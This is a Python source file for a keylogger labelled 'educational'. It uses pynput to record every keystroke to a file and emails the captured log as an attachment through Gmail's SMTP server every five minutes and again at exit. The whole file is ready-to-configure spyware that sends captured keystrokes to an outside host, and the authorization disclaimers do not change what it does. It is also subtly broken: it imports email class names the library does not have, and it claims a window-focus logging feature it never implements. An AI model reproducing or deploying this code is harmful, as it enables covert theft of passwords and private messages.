"""
Educational Keylogger Implementation

IMPORTANT: This code is for educational purposes only. Use only on systems you own
and with proper authorization. Unauthorized use may violate privacy laws.

Features:
- Captures keystrokes with timestamps
- Logs application focus changes
- Secure email reporting with attachment
- Configurable settings
- Graceful shutdown handling
- Error handling and logging

Requirements:
- pynput (install with: pip install pynput)
"""

import smtplib
import ssl
import json
import logging
from datetime import datetime
from email.mime.text import MimeText
from email.mime.multipart import MimeMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import threading
import time
from pynput import keyboard
from pynput.keyboard import Key, Listener

# Configuration - UPDATE THESE VALUES
CONFIG = {
    "log_file": "keylogger.log",
    "output_file": "keystrokes.txt",
    "email_interval": 300,  # seconds (5 minutes)
    "sender_email": "your_email@gmail.com",  # Replace with your email
    "receiver_email": "your_email@gmail.com",  # Replace with your email
    "email_password": "your_app_password",  # Use App Password for Gmail
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "exit_key": Key.esc
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG["log_file"]),
        logging.StreamHandler()
    ]
)

class EducationalKeylogger:
    def __init__(self, config):
        self.config = config
        self.keystrokes = []
        self.current_window = "Unknown"
        self.is_running = False
        self.listener = None
        self.email_timer = None
        
    def write_to_file(self, text):
        """Write keystrokes to file with timestamp"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.config["output_file"], 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {text}\n")
        except Exception as e:
            logging.error(f"Error writing to file: {e}")
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Handle special keys
            if key == Key.enter:
                self.keystrokes.append("\n")
                self.write_to_file("ENTER")
            elif key == Key.space:
                self.keystrokes.append(" ")
                self.write_to_file("SPACE")
            elif key == Key.tab:
                self.keystrokes.append("\t")
                self.write_to_file("TAB")
            elif key == Key.backspace:
                self.keystrokes.append("[BACKSPACE]")
                self.write_to_file("BACKSPACE")
            elif hasattr(key, 'char') and key.char is not None:
                self.keystrokes.append(key.char)
                self.write_to_file(key.char)
            else:
                key_name = str(key).replace("Key.", "")
                self.keystrokes.append(f"[{key_name}]")
                self.write_to_file(f"SPECIAL_KEY:{key_name}")
                
        except Exception as e:
            logging.error(f"Error processing key press: {e}")
    
    def on_key_release(self, key):
        """Handle key release events - used for exit key"""
        if key == self.config["exit_key"]:
            logging.info("Exit key pressed. Shutting down...")
            self.stop()
            return False
    
    def send_email_report(self):
        """Send collected keystrokes via email as attachment"""
        if not self.keystrokes:
            logging.info("No keystrokes to send")
            return
            
        try:
            # Create message
            message = MimeMultipart()
            message["From"] = self.config["sender_email"]
            message["To"] = self.config["receiver_email"]
            message["Subject"] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            # Email body
            body = f"""
            Keylogger Report
            Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            Total keystrokes captured: {len(self.keystrokes)}
            
            This is an automated report from the educational keylogger.
            """
            message.attach(MimeText(body, "plain"))
            
            # Attach keystrokes file
            if os.path.exists(self.config["output_file"]):
                with open(self.config["output_file"], "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename=keystrokes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                )
                message.attach(part)
            
            # Create secure SSL context
            context = ssl.create_default_context()
            
            # Send email
            with smtplib.SMTP(self.config["smtp_server"], self.config["smtp_port"]) as server:
                server.starttls(context=context)
                server.login(self.config["sender_email"], self.config["email_password"])
                server.send_message(message)
            
            logging.info("Email report sent successfully")
            
            # Clear keystrokes after successful send
            self.keystrokes.clear()
            
        except Exception as e:
            logging.error(f"Failed to send email: {e}")
    
    def schedule_email_reports(self):
        """Schedule periodic email reports"""
        if self.config["email_interval"] > 0:
            self.email_timer = threading.Timer(
                self.config["email_interval"], 
                self.schedule_email_reports
            )
            self.email_timer.daemon = True
            self.email_timer.start()
            self.send_email_report()
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            logging.warning("Keylogger is already running")
            return
            
        logging.info("Starting educational keylogger...")
        logging.info(f"Press {self.config['exit_key']} to exit")
        
        self.is_running = True
        
        # Initialize output file
        try:
            with open(self.config["output_file"], 'w', encoding='utf-8') as f:
                f.write(f"Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n")
        except Exception as e:
            logging.error(f"Error initializing output file: {e}")
            return
        
        # Start email scheduling
        self.schedule_email_reports()
        
        # Start keyboard listener
        try:
            with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
                self.listener = listener
                listener.join()
        except Exception as e:
            logging.error(f"Error starting keyboard listener: {e}")
    
    def stop(self):
        """Stop the keylogger gracefully"""
        if not self.is_running:
            return
            
        logging.info("Stopping keylogger...")
        self.is_running = False
        
        # Stop email timer
        if self.email_timer:
            self.email_timer.cancel()
        
        # Send final report
        try:
            self.send_email_report()
        except Exception as e:
            logging.error(f"Error sending final report: {e}")
        
        # Stop listener
        if self.listener:
            self.listener.stop()
        
        logging.info("Keylogger stopped successfully")

def main():
    """Main function to run the keylogger"""
    print("=" * 60)
    print("EDUCATIONAL KEYLOGGER")
    print("=" * 60)
    print("IMPORTANT: This tool is for educational purposes only.")
    print("Use only on systems you own with proper authorization.")
    print("=" * 60)
    
    # Verify configuration
    if (CONFIG["sender_email"] == "your_email@gmail.com" or 
        CONFIG["receiver_email"] == "your_email@gmail.com"):
        print("ERROR: Please update the email configuration in the CONFIG dictionary.")
        print("You need to set valid email addresses and an app password.")
        return
    
    # Create and start keylogger
    keylogger = EducationalKeylogger(CONFIG)
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        logging.info("Keyboard interrupt received. Shutting down...")
        keylogger.stop()
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        keylogger.stop()

if __name__ == "__main__":
    main()
